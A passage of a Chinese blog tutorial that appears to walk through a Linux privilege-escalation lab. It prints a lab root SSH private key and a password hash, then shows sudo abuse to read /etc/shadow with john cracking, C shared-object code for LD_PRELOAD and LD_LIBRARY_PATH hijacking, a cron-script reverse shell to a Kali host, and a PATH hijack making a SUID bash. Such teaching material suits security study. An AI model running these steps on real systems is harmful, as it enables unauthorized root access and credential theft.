class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643163.png" alt="image-20210630150549882"></p><h4 id="2-使用su命令切换到新根用户："><a href="#2-使用su命令切换到新根用户：" class="headerlink" title="2.使用su命令切换到新根用户："></a>2.使用su命令切换到新根用户：</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643164.png" alt="image-20210630150624343"></p><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><h3 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h3><p>即使计算机在重要或敏感文件上拥有正确的权限，用户也可能已创建这些文件的不安全备份。<br>它总是值得探索的文件系统寻找可读的备份文件。</p><p>一些常见的地方包括 / (root) directory, /tmp, and /var/backups</p><h3 id="实操-4"><a href="#实操-4" class="headerlink" title="实操"></a>实操</h3><h3 id="1-在常见位置查找文件，尤其是一些隐藏文件"><a href="#1-在常见位置查找文件，尤其是一些隐藏文件" class="headerlink" title="1.在常见位置查找文件，尤其是一些隐藏文件"></a>1.在常见位置查找文件，尤其是一些隐藏文件</h3><pre class="line-numbers language-none"><code class="language-none">ls -la /home/user ls -la / ls -la /tmp ls -la /var/backups<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643165.png" alt="image-20210630151315783"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643166.png" alt="image-20210630151343205"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643167.png" alt="image-20210630151358879"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643168.png" alt="image-20210630151410318"></p><h3 id="2-root目录下存在隐藏的-ssh目录："><a href="#2-root目录下存在隐藏的-ssh目录：" class="headerlink" title="2.root目录下存在隐藏的.ssh目录："></a>2.root目录下存在隐藏的<code>.ssh</code>目录：</h3><pre class="line-numbers language-none"><code class="language-none">drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-翻看-ssh目录"><a href="#3-翻看-ssh目录" class="headerlink" title="3.翻看.ssh目录"></a>3.翻看<code>.ssh</code>目录</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643169.png" alt="image-20210630151814494"></p><p>一个可读的文件<code>root_key</code></p><h3 id="4-进一步检查root-key文件"><a href="#4-进一步检查root-key文件" class="headerlink" title="4.进一步检查root_key文件"></a>4.进一步检查root_key文件</h3><pre class="line-numbers language-none"><code class="language-none">head -n 1 /.ssh/root_key <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643170.png" alt="image-20210630151929543"></p><p>这是一个 SSH 私钥。文件的名称和所有者告诉我们密钥属于root用户：</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在我们尝试使用此密钥之前，让我们确认甚至允许通过 SSH 登录根：</p><pre class="line-numbers language-none"><code class="language-none">grep PermitRootLogin /etc/ssh/sshd_config <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643171.png" alt="image-20210630152045099"></p><h3 id="5-将密钥复制到本地机器，并给予其正确的权限"><a href="#5-将密钥复制到本地机器，并给予其正确的权限" class="headerlink" title="5.将密钥复制到本地机器，并给予其正确的权限"></a>5.将密钥复制到本地机器，并给予其正确的权限</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643172.png" alt="image-20210630152738111"></p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNmgLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExlp4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQoOHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HDeV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFETZ36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZYaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244elWUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N76JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzcU7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51ZiSXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GVd+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561ImjQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/okX2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfNWhp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">chmod 600 root_key 赋予权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-使用将SSH的密钥登录root帐户："><a href="#6-使用将SSH的密钥登录root帐户：" class="headerlink" title="6.使用将SSH的密钥登录root帐户："></a>6.使用将SSH的密钥登录root帐户：</h3><pre class="line-numbers language-none"><code class="language-none">ssh -i root_key root@192.168.175.228<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643173.png" alt="image-20210704102546394"></p><h1 id="0x07-SUDO"><a href="#0x07-SUDO" class="headerlink" title="0x07 SUDO"></a>0x07 SUDO</h1><h2 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2><p>sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。</p><p>默认情况下，该其他用户将是root用户<br>用户通常需要输入密码才能使用sudo，并且必须允许用户通过<code>/etc/sudoersfile</code>文件中的规则访问。<br>规则可用于将用户限制在某些程序中，并放弃密码输入要求。</p><h2 id="相关的命令-1"><a href="#相关的命令-1" class="headerlink" title="相关的命令"></a>相关的命令</h2><p>使用sudo运行程序：</p><pre class="line-numbers language-none"><code class="language-none">sudo &lt;program&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以特定用户的身份运行程序：</p><pre class="line-numbers language-none"><code class="language-none">sudo –u &lt;username&gt; &lt;program&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>允许（且不允许）运行列出用户的程序：</p><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到目前为止，用sudo最明显的特权升级是使用sudo，因为它是预期的！</p><p>通过使用交换用户<code>su</code>命令生成root</p><pre class="line-numbers language-none"><code class="language-none">sudo su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他方法<br>有些时候不允许执行 su 计划，则有许多其他方法可以升级特权：</p><pre class="line-numbers language-none"><code class="language-none">sudo -s sudo -i sudo /bin/bash sudo passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即使没有”明显”的方法来升级特权，我们也可以使用外壳逃生序列。</p><h2 id="外壳逃生序列"><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>即使我们仅限于通过sudo运行某些程序，有时也有可能”逃避”程序并生成壳。<br>由于初始程序具有root权限运行，因此生成的外壳也是如此。<br>此处可以找到带有外壳逃生序列的程序列表：<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-列出允许用户运行的程序"><a href="#1-列出允许用户运行的程序" class="headerlink" title="1.列出允许用户运行的程序"></a>1.列出允许用户运行的程序</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643174.png" alt="image-20210630162439011"></p><h3 id="2-对每个程序进行查表，要细心"><a href="#2-对每个程序进行查表，要细心" class="headerlink" title="2.对每个程序进行查表，要细心"></a>2.对每个程序进行查表，要细心</h3><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="3-如果存在逃生序列，则通过sudo-运行程序并执行序列以生成根壳。"><a href="#3-如果存在逃生序列，则通过sudo-运行程序并执行序列以生成根壳。" class="headerlink" title="3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。"></a>3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</h3><h2 id="滥用预期功能"><a href="#滥用预期功能" class="headerlink" title="滥用预期功能"></a>滥用预期功能</h2><p>如果程序没有逃生序列，则仍可能使用它来升级权限。<br>如果我们能够读取root用户拥有的文件，我们也许能够提取有用的信息（例如密码、哈希斯、密钥）。<br>如果我们 可以写信给root拥有的文件，我们也许能够插入或修改信息。</p><h3 id="实操-5"><a href="#实操-5" class="headerlink" title="实操"></a>实操</h3><h4 id="1-允许用户通过Sudo运行的程序："><a href="#1-允许用户通过Sudo运行的程序：" class="headerlink" title="1.允许用户通过Sudo运行的程序："></a>1.允许用户通过Sudo运行的程序：</h4><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643174.png" alt="image-20210630162439011"></p><h4 id="2-apache2"><a href="#2-apache2" class="headerlink" title="2.apache2"></a>2.apache2</h4><p> 已知中：apache2没有任何已知的外壳逃逸 </p><p> 但是，在解析给定的配置文件时，会出错并打印任何它不理解的行 </p><h4 id="3-使用sudo运行apache2，并提供-etc-shadow文件作为配置文件"><a href="#3-使用sudo运行apache2，并提供-etc-shadow文件作为配置文件" class="headerlink" title="3.使用sudo运行apache2，并提供/etc/shadow文件作为配置文件"></a>3.使用sudo运行apache2，并提供/etc/shadow文件作为配置文件</h4><pre class="line-numbers language-none"><code class="language-none">sudo apache2 -f /etc/shadow <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643175.png" alt="image-20210630163336520"></p><h4 id="4-从文件中提取根用户的哈希。"><a href="#4-从文件中提取根用户的哈希。" class="headerlink" title="4.从文件中提取根用户的哈希。"></a>4.从文件中提取根用户的哈希。</h4><h4 id="5-将密码哈希保存在文件中："><a href="#5-将密码哈希保存在文件中：" class="headerlink" title="5.将密码哈希保存在文件中："></a>5.将密码哈希保存在文件中：</h4><pre class="line-numbers language-none"><code class="language-none">echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' &gt; hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643176.png" alt="image-20210630163503549"></p><h4 id="6-使用开膛手破解密码哈希："><a href="#6-使用开膛手破解密码哈希：" class="headerlink" title="6.使用开膛手破解密码哈希："></a>6.使用开膛手破解密码哈希：</h4><pre class="line-numbers language-none"><code class="language-none">john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643152.png" alt="image-20210630141447898"></p><h4 id="7-使用su-命令切换到root用户"><a href="#7-使用su-命令切换到root用户" class="headerlink" title="7.使用su 命令切换到root用户"></a>7.使用su 命令切换到root用户</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643177.png" alt="image-20210630164008714"></p><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>通过sudo运行的程序可以从用户的环境中继承环境变量。<br>在<code> /etc/sudoers</code>配置文件中，</p><p>如果设置<code>env_reset</code>选项，sudo 将在新的、最小的环境中运行程序。<br><code>env_keep</code>选项可用于防止某些环境变量远离用户的环境。<br><code>sudo -l</code>时显示配置的选项</p><h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><h5 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h5><p>LD_PRELOAD预加载 是一个环境变量，可以设置为共享对象 (.so)文件的路径。<br>设置时，共享对象将先于任何其他对象加载。<br>通过创建自定义共享对象并创建 init()功能，我们可以在加载 object 后立即执行代码。</p><h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><p>如果真正的用户 ID与有效的用户 ID不同，则LD_PRELOAD将不起作用。<br>必须配置 sudo，以便使用<code>env_keep</code>选项来维护LD_PRELOAD环境变量。</p><h5 id="实操-6"><a href="#实操-6" class="headerlink" title="实操"></a>实操</h5><h5 id="1-列出允许用户运行的程序-1"><a href="#1-列出允许用户运行的程序-1" class="headerlink" title="1.列出允许用户运行的程序"></a>1.列出允许用户运行的程序</h5><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643179.png" alt="image-20210704102838002"></p><p>注意：<code>env_keep</code>包括<code>LD_PRELOAD</code>环境变量</p><h5 id="2-创建具有以下内容的文件-preload-c-："><a href="#2-创建具有以下内容的文件-preload-c-：" class="headerlink" title="2.创建具有以下内容的文件(preload.c)："></a>2.创建具有以下内容的文件(preload.c)：</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643180.png" alt="image-20210704103218382"></p><h5 id="3-编译preload-c到preload-so："><a href="#3-编译preload-c到preload-so：" class="headerlink" title="3.编译preload.c到preload.so："></a>3.编译preload.c到preload.so：</h5><pre class="line-numbers language-none"><code class="language-none">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-使用sudo运行任何允许的程序，同时将LD-PRELOAD环境变量设置为preload-so文件的完整路径："><a href="#4-使用sudo运行任何允许的程序，同时将LD-PRELOAD环境变量设置为preload-so文件的完整路径：" class="headerlink" title="4.使用sudo运行任何允许的程序，同时将LD_PRELOAD环境变量设置为preload.so文件的完整路径："></a>4.使用sudo运行任何允许的程序，同时将LD_PRELOAD环境变量设置为preload.so文件的完整路径：</h5><pre class="line-numbers language-none"><code class="language-none">sudo LD_PRELOAD=/tmp/preload.so apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643181.png" alt="image-20210704103256577"></p><h4 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h4><h4 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h4><p>LD_LIBRARY_PATH环境变量包含一组目录，首先搜索共享库。<br>ldd 命令可用于打印程序使用的共享库：</p><pre class="line-numbers language-none"><code class="language-none">ldd /usr/sbin/apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过创建与程序使用的同名共享库，并将LD_LIBRARY_PATH设置为其父目录，程序将转而加载我们的共享库。</p><h4 id="实操-7"><a href="#实操-7" class="headerlink" title="实操"></a>实操</h4><h5 id="1-运行ldd对apache2程序文件："><a href="#1-运行ldd对apache2程序文件：" class="headerlink" title="1.运行ldd对apache2程序文件："></a>1.运行ldd对apache2程序文件：</h5><pre class="line-numbers language-none"><code class="language-none">ldd /usr/sbin/apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643182.png" alt="image-20210704103440965"></p><p>这个方法是进行劫持共享对象是命中或未命中的，从中选择一个列表并尝试它</p><h5 id="2-创建具有以下内容的文件-library-path-c-："><a href="#2-创建具有以下内容的文件-library-path-c-：" class="headerlink" title="2.创建具有以下内容的文件(library_path.c)："></a>2.创建具有以下内容的文件(library_path.c)：</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hijack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">hijack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_LIBRARY_PATH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643183.png" alt="image-20210704103702129"></p><h5 id="3-将library-path-c-编译成libcrypt-so-1"><a href="#3-将library-path-c-编译成libcrypt-so-1" class="headerlink" title="3.将library_path.c 编译成libcrypt.so.1:"></a>3.将library_path.c 编译成libcrypt.so.1:</h5><pre class="line-numbers language-none"><code class="language-none">gcc -o libcrypt.so.1 -shared -fPIC library_path.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-使用-sudo运行-apache2，同时将LD-LIBRARY-PATH环境变量设置为当前路径（我们汇编library-path-c）："><a href="#4-使用-sudo运行-apache2，同时将LD-LIBRARY-PATH环境变量设置为当前路径（我们汇编library-path-c）：" class="headerlink" title="4.使用 sudo运行 apache2，同时将LD_LIBRARY_PATH环境变量设置为当前路径（我们汇编library_path.c）："></a>4.使用 sudo运行 apache2，同时将LD_LIBRARY_PATH环境变量设置为当前路径（我们汇编library_path.c）：</h5><pre class="line-numbers language-none"><code class="language-none">sudo LD_LIBRARY_PATH=. apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643184.png" alt="image-20210704103723147"></p><h1 id="0x08-Cron-jobs"><a href="#0x08-Cron-jobs" class="headerlink" title="0x08 Cron jobs"></a>0x08 Cron jobs</h1><h2 id="前言-10"><a href="#前言-10" class="headerlink" title="前言"></a>前言</h2><p>Cron jobs是用户可以安排在特定时间或间隔运行的程序或脚本。<br>Cron jobs与拥有它们的用户的安全级别一起运行。<br>默认情况下，使用环境变量有限的<code>/bin/sh</code> shell</p><h2 id="Cron-tables"><a href="#Cron-tables" class="headerlink" title="Cron tables"></a>Cron tables</h2><p>Cron tables存储了Cron jobs的配置<br>User Crontabs通常位于<code>/var/spool/cron/</code> or <code>/var/spool/cron/crontabs/</code><br>system系统的crontab位于<code>/etc/crontab</code></p><h2 id="文件权限-1"><a href="#文件权限-1" class="headerlink" title="文件权限"></a>文件权限</h2><p>与 Cron jobs关联的文件权限配置错误可能导致提权<br>如果我们可以编写到作为 cron jobs的一部分运行的程序或脚本，我们可以用我们自己的代码替换它。</p><h2 id="实操-8"><a href="#实操-8" class="headerlink" title="实操"></a>实操</h2><h3 id="1-查看system-wide-crontab的内容："><a href="#1-查看system-wide-crontab的内容：" class="headerlink" title="1.查看system-wide crontab的内容："></a>1.查看system-wide crontab的内容：</h3><pre class="line-numbers language-cat" data-language="cat"><div class="caption"><span>/etc/crontab</span></div><code class="language-cat">cat /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643185.png" alt="image-20210630171256823"></p><h3 id="2-在服务器上查找overwrite-sh-文件："><a href="#2-在服务器上查找overwrite-sh-文件：" class="headerlink" title="2.在服务器上查找overwrite.sh 文件："></a>2.在服务器上查找overwrite.sh 文件：</h3><pre class="line-numbers language-none"><code class="language-none">locate overwrite.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643186.png" alt="image-20210630171347594"></p><pre class="line-numbers language-none"><code class="language-none">/usr/local/bin/overwrite.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-检查文件的权限"><a href="#3-检查文件的权限" class="headerlink" title="3.检查文件的权限"></a>3.检查文件的权限</h3><pre class="line-numbers language-none"><code class="language-none">ls -l /usr/local/bin/overwrite.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643187.png" alt="image-20210630171515478"></p><p>注意：这个文件是可写的</p><h3 id="4-将-overwrite-sh文件的内容替换为："><a href="#4-将-overwrite-sh文件的内容替换为：" class="headerlink" title="4.将 overwrite.sh文件的内容替换为："></a>4.将 overwrite.sh文件的内容替换为：</h3><pre class="line-numbers language-none"><code class="language-none">#!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.175.130/4444 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643188.png" alt="image-20210630171650623"></p><h3 id="5-kali上运行nc"><a href="#5-kali上运行nc" class="headerlink" title="5.kali上运行nc"></a>5.kali上运行nc</h3><p>等待 cron jobs运行，返回root权限</p><h2 id="路径环境变量"><a href="#路径环境变量" class="headerlink" title="路径环境变量"></a>路径环境变量</h2><p>默认情况下，crontab环境变量设置为：<code>/usr/bin:/bin</code><br>路径变量可以覆盖在crontab文件中。<br>如果 cron jobs程序/脚本不使用绝对路径，并且其中一个 PATH 目录可由我们的用户编写，我们也许能够创建与 cron jobs同名的程序/脚本。</p><h2 id="实操-9"><a href="#实操-9" class="headerlink" title="实操"></a>实操</h2><h3 id="1-查看system-wide-crontab的内容：-1"><a href="#1-查看system-wide-crontab的内容：-1" class="headerlink" title="1.查看system-wide crontab的内容："></a>1.查看system-wide crontab的内容：</h3><pre class="line-numbers language-none"><code class="language-none">cat /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643189.png" alt="image-20210630173619529"></p><p>请注意，/home/user目录（我们可以写信给）位于 PATH 变量的开头，并且第一个 cron jobs不使用绝对路径。</p><h3 id="2-在-home-user-中创建文件-overwrite-sh，内容如下："><a href="#2-在-home-user-中创建文件-overwrite-sh，内容如下：" class="headerlink" title="2.在/home/user 中创建文件 overwrite.sh，内容如下："></a>2.在/home/user 中创建文件 overwrite.sh，内容如下：</h3><pre class="line-numbers language-none"><code class="language-none">#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643190.png" alt="image-20210630173757396"></p><h3 id="3-加权"><a href="#3-加权" class="headerlink" title="3.加权"></a>3.加权</h3><pre class="line-numbers language-none"><code class="language-none">$ chmod +x /home/user/overwrite.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-等待cronjob运行（此作业尤其每分钟运行一次）。"><a href="#4-等待cronjob运行（此作业尤其每分钟运行一次）。" class="headerlink" title="4.等待cronjob运行（此作业尤其每分钟运行一次）。"></a>4.等待cronjob运行（此作业尤其每分钟运行一次）。</h3><h3 id="5-创建-tmp-rootbash文件"><a href="#5-创建-tmp-rootbash文件" class="headerlink" title="5.创建/tmp/rootbash文件"></a>5.创建/tmp/rootbash文件</h3><p>执行它，使用与-p保存有效的UID</p><pre class="line-numbers language-none"><code class="language-none">/tmp/rootbash –p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643191.png" alt="image-20210630174309759"></p><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><h3 id="前言-11"><a href="#前言-11" class="headerlink" title="前言"></a>前言</h3><p>当通配符字符 <code>* </code>作为参数的一部分提供给命令时，外壳将首先在通配符上执行 文件名扩展 （也称为 globbing）</p><p>此过程将用以空格分隔的文件列表替换通配符，以及当前目录中的目录名</p><p>执行命令：</p><pre class="line-numbers language-echo" data-language="echo"><div class="caption"><span>*</span></div><code class="language-echo">echo *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="通配符-amp-文件名"><a href="#通配符-amp-文件名" class="headerlink" title="通配符 &amp; 文件名"></a>通配符 &amp; 文件名</h3><p>由于Linux 中的文件系统通常对文件名非常允许，并且文件名扩展在执行命令之前发生，因此可以通过创建具有这些名称的文件将命令行选项（例如 -h，-help）传递到命令</p><p>文件名不仅限于简单的选项<br>事实上，我们可以创建匹配复杂选项的文件名：</p><pre class="line-numbers language-none"><code class="language-none">--option=key=value <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考：<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p><p>可以帮助确定命令是否有有命令行选项</p><h3 id="实操-10"><a href="#实操-10" class="headerlink" title="实操"></a>实操</h3><h4 id="1-查看system-wide-crontab内容"><a href="#1-查看system-wide-crontab内容" class="headerlink" title="1.查看system-wide crontab内容:"></a>1.查看system-wide crontab内容:</h4><pre class="line-numbers language-none"><code class="language-none">cat /etc/crontab <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 